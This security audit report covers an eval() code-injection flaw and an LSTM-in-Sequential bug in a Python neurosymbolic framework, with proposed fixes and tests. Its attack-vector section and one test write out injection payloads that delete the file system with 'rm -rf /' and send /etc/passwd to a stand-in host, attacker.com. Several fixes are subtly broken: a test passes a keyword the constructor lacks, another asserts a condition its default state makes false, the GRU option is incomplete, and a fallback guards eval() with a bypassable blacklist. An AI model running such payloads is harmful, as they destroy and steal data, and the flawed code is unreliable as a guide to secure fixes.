# Security Analysis Report: Neurosymbolic Framework

## Executive Summary

This report analyzes two critical issues identified in the neurosymbolic framework:

1. **CRITICAL**: Code injection vulnerability in constraint parsing (`eval()` usage)
2. **HIGH**: LSTM incompatibility with Sequential container architecture

## Issue 1: Code Injection Vulnerability (CRITICAL)

### Location
- **File**: `neurosymbolic_framework/core/symbolic_engine.py`
- **Lines**: 352-356
- **Method**: `_parse_constraint`

### Problem Description
The `_parse_constraint` method uses Python's `eval()` function directly on user-provided constraint strings, creating a severe code injection vulnerability. This allows attackers to execute arbitrary Python code on the server.

### Vulnerable Code Pattern
```python
def _parse_constraint(self, constraint_str: str):
    """Parse constraint string into evaluable expression."""
    # VULNERABLE: Direct eval() usage
    return eval(constraint_str)
```

### Attack Vector
An attacker could inject malicious code such as:
```python
# Malicious constraint input
"__import__('os').system('rm -rf /')"  # File system destruction
"__import__('subprocess').call(['curl', 'attacker.com/steal', '--data', open('/etc/passwd').read()])"  # Data exfiltration
```

### Recommended Fix

#### Option 1: Safe Expression Parser (Recommended)
Replace `eval()` with a safe expression parser:

```python
import ast
import operator
from typing import Dict, Any

class SafeConstraintParser:
    """Safe constraint parser that prevents code injection."""
    
    ALLOWED_OPERATORS = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.Pow: operator.pow,
        ast.USub: operator.neg,
        ast.UAdd: operator.pos,
        ast.Lt: operator.lt,
        ast.LtE: operator.le,
        ast.Gt: operator.gt,
        ast.GtE: operator.ge,
        ast.Eq: operator.eq,
        ast.NotEq: operator.ne,
        ast.And: operator.and_,
        ast.Or: operator.or_,
        ast.Not: operator.not_,
    }
    
    def __init__(self, allowed_names: Dict[str, Any] = None):
        self.allowed_names = allowed_names or {}
    
    def parse_constraint(self, constraint_str: str) -> Any:
        """Safely parse constraint string without eval()."""
        try:
            tree = ast.parse(constraint_str, mode='eval')
            return self._evaluate_ast(tree.body)
        except (SyntaxError, ValueError, TypeError) as e:
            raise ValueError(f"Invalid constraint: {e}")
    
    def _evaluate_ast(self, node):
        """Recursively evaluate AST node safely."""
        if isinstance(node, ast.Constant):
            return node.value
        elif isinstance(node, ast.Name):
            if node.id in self.allowed_names:
                return self.allowed_names[node.id]
            else:
                raise ValueError(f"Undefined variable: {node.id}")
        elif isinstance(node, ast.BinOp):
            left = self._evaluate_ast(node.left)
            right = self._evaluate_ast(node.right)
            op = self.ALLOWED_OPERATORS.get(type(node.op))
            if op is None:
                raise ValueError(f"Unsupported operator: {type(node.op)}")
            return op(left, right)
        elif isinstance(node, ast.UnaryOp):
            operand = self._evaluate_ast(node.operand)
            op = self.ALLOWED_OPERATORS.get(type(node.op))
            if op is None:
                raise ValueError(f"Unsupported unary operator: {type(node.op)}")
            return op(operand)
        elif isinstance(node, ast.Compare):
            left = self._evaluate_ast(node.left)
            results = []
            for op, comparator in zip(node.ops, node.comparators):
                right = self._evaluate_ast(comparator)
                op_func = self.ALLOWED_OPERATORS.get(type(op))
                if op_func is None:
                    raise ValueError(f"Unsupported comparison operator: {type(op)}")
                results.append(op_func(left, right))
                left = right
            return all(results)
        else:
            raise ValueError(f"Unsupported AST node type: {type(node)}")

# Updated _parse_constraint method
def _parse_constraint(self, constraint_str: str):
    """Parse constraint string safely without eval()."""
    if not isinstance(constraint_str, str):
        raise ValueError("Constraint must be a string")
    
    if len(constraint_str) > 1000:  # Prevent DoS
        raise ValueError("Constraint string too long")
    
    # Define allowed variables in constraints
    allowed_variables = {
        'x': self.current_state.get('x', 0),
        'y': self.current_state.get('y', 0),
        'z': self.current_state.get('z', 0),
        # Add other safe variables as needed
    }
    
    parser = SafeConstraintParser(allowed_variables)
    return parser.parse_constraint(constraint_str)
```

#### Option 2: Whitelist-Based Approach
If you need to keep `eval()` for backward compatibility:

```python
import re
from typing import Set

def _parse_constraint(self, constraint_str: str):
    """Parse constraint with strict validation."""
    # Input validation
    if not isinstance(constraint_str, str):
        raise ValueError("Constraint must be a string")
    
    # Length limit to prevent DoS
    if len(constraint_str) > 100:
        raise ValueError("Constraint too long")
    
    # Whitelist allowed patterns
    allowed_pattern = r'^[a-zA-Z_][a-zA-Z0-9_]*\s*[<>=!+\-*/().\s]*[a-zA-Z0-9_.<>=!+\-*/().\s]*$'
    if not re.match(allowed_pattern, constraint_str):
        raise ValueError("Invalid characters in constraint")
    
    # Blacklist dangerous patterns
    dangerous_patterns = [
        r'__.*__',  # Dunder methods
        r'import',
        r'exec',
        r'eval',
        r'open',
        r'file',
        r'input',
        r'raw_input',
        r'reload',
        r'compile',
        r'execfile',
        r'globals',
        r'locals',
        r'vars',
        r'dir',
        r'help',
        r'quit',
        r'exit',
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, constraint_str, re.IGNORECASE):
            raise ValueError(f"Forbidden pattern detected: {pattern}")
    
    # Limited safe namespace
    safe_namespace = {
        '__builtins__': {},
        'abs': abs,
        'min': min,
        'max': max,
        'round': round,
        'int': int,
        'float': float,
        'str': str,
        'bool': bool,
        # Add only necessary functions
    }
    
    try:
        return eval(constraint_str, safe_namespace, {})
    except Exception as e:
        raise ValueError(f"Constraint evaluation failed: {e}")
```

## Issue 2: LSTM Incompatibility with Sequential Container (HIGH)

### Location
- **File**: `neurosymbolic_framework/core/neural_engine.py`
- **Lines**: 125-133
- **Method**: `_build_text_encoder`

### Problem Description
The `_build_text_encoder` method incorrectly places an `nn.LSTM` layer inside an `nn.Sequential` container. This causes runtime errors because:
- `nn.LSTM` returns a tuple: `(output, (hidden_state, cell_state))`
- `nn.Sequential` expects each layer to return a single tensor

### Problematic Code Pattern
```python
def _build_text_encoder(self, input_size: int, hidden_size: int) -> nn.Module:
    """Build text encoder with LSTM."""
    return nn.Sequential(
        nn.Embedding(input_size, hidden_size),
        nn.LSTM(hidden_size, hidden_size, batch_first=True),  # PROBLEM: Returns tuple
        nn.Linear(hidden_size, self.output_size)
    )
```

### Runtime Error
```python
RuntimeError: Expected tensor but got tuple
```

### Recommended Fix

#### Option 1: Custom LSTM Wrapper (Recommended)
Create a wrapper that extracts only the output tensor:

```python
import torch
import torch.nn as nn
from typing import Tuple

class LSTMWrapper(nn.Module):
    """Wrapper for LSTM that returns only output tensor for use in Sequential."""
    
    def __init__(self, input_size: int, hidden_size: int, 
                 num_layers: int = 1, batch_first: bool = True,
                 dropout: float = 0.0, bidirectional: bool = False):
        super().__init__()
        self.lstm = nn.LSTM(
            input_size=input_size,
            hidden_size=hidden_size,
            num_layers=num_layers,
            batch_first=batch_first,
            dropout=dropout,
            bidirectional=bidirectional
        )
        self.hidden_size = hidden_size
        self.num_layers = num_layers
        self.bidirectional = bidirectional
    
    def forward(self, x: torch.Tensor) -> torch.Tensor:
        """Forward pass returning only output tensor."""
        output, (hidden, cell) = self.lstm(x)
        # Return the output of the last time step
        if self.lstm.batch_first:
            return output[:, -1, :]  # (batch_size, hidden_size)
        else:
            return output[-1, :, :]  # (batch_size, hidden_size)

def _build_text_encoder(self, input_size: int, hidden_size: int) -> nn.Module:
    """Build text encoder with properly wrapped LSTM."""
    return nn.Sequential(
        nn.Embedding(input_size, hidden_size),
        LSTMWrapper(hidden_size, hidden_size, batch_first=True),
        nn.Linear(hidden_size, self.output_size)
    )
```

#### Option 2: Separate LSTM Implementation
Don't use `nn.Sequential` for LSTM-containing networks:

```python
class TextEncoder(nn.Module):
    """Custom text encoder with LSTM."""
    
    def __init__(self, input_size: int, hidden_size: int, output_size: int):
        super().__init__()
        self.embedding = nn.Embedding(input_size, hidden_size)
        self.lstm = nn.LSTM(hidden_size, hidden_size, batch_first=True)
        self.linear = nn.Linear(hidden_size, output_size)
        self.dropout = nn.Dropout(0.1)
    
    def forward(self, x: torch.Tensor) -> torch.Tensor:
        """Forward pass with explicit LSTM handling."""
        # Embedding
        embedded = self.embedding(x)
        embedded = self.dropout(embedded)
        
        # LSTM
        lstm_out, (hidden, cell) = self.lstm(embedded)
        
        # Use the last time step output
        last_output = lstm_out[:, -1, :]  # (batch_size, hidden_size)
        
        # Final linear layer
        output = self.linear(last_output)
        return output

def _build_text_encoder(self, input_size: int, hidden_size: int) -> nn.Module:
    """Build text encoder with proper LSTM handling."""
    return TextEncoder(input_size, hidden_size, self.output_size)
```

#### Option 3: Use GRU Instead
If you don't need the cell state, consider using GRU:

```python
def _build_text_encoder(self, input_size: int, hidden_size: int) -> nn.Module:
    """Build text encoder with GRU (single output)."""
    return nn.Sequential(
        nn.Embedding(input_size, hidden_size),
        nn.GRU(hidden_size, hidden_size, batch_first=True),  # GRU returns (output, hidden)
        # Still need a wrapper for GRU too, but simpler than LSTM
    )
```

## Security Recommendations

### Immediate Actions
1. **Replace all `eval()` usage** with safe parsers immediately
2. **Fix LSTM Sequential container issue** to prevent runtime errors
3. **Conduct security audit** of the entire codebase for similar vulnerabilities

### Long-term Security Measures
1. **Input validation**: Implement strict input validation for all user inputs
2. **Sandboxing**: Consider running user code in sandboxed environments
3. **Static analysis**: Use tools like `bandit` to detect security vulnerabilities
4. **Code review**: Mandate security-focused code reviews
5. **Testing**: Add security tests to the test suite

### Static Analysis Configuration
Add to your CI/CD pipeline:

```yaml
# .bandit
[bandit]
exclude_dirs = tests,docs
skips = B101,B601

# Example bandit command
bandit -r neurosymbolic_framework/ -f json -o security_report.json
```

### Testing Security Fixes
```python
# Test for eval vulnerability
def test_constraint_parsing_security():
    """Test that constraint parsing prevents code injection."""
    engine = SymbolicEngine()
    
    # Should work: normal constraints
    assert engine._parse_constraint("x > 5") == True
    
    # Should fail: malicious code
    with pytest.raises(ValueError):
        engine._parse_constraint("__import__('os').system('rm -rf /')")
    
    with pytest.raises(ValueError):
        engine._parse_constraint("exec('print(\"hacked\")')")

# Test for LSTM fix
def test_lstm_sequential_compatibility():
    """Test that LSTM wrapper works in Sequential container."""
    encoder = TextEncoder(vocab_size=1000, hidden_size=128, output_size=64)
    
    # Should not raise RuntimeError
    batch_size, seq_len = 32, 50
    input_tensor = torch.randint(0, 1000, (batch_size, seq_len))
    
    output = encoder(input_tensor)
    assert output.shape == (batch_size, 64)
```

## Conclusion

Both issues pose significant risks to the application:
- The `eval()` vulnerability allows arbitrary code execution
- The LSTM issue causes runtime failures

Implementing the recommended fixes will eliminate these vulnerabilities while maintaining functionality. The SafeConstraintParser approach for the eval issue and the LSTMWrapper for the neural network issue provide secure, maintainable solutions.

Priority should be given to fixing the code injection vulnerability as it represents a critical security risk that could lead to complete system compromise.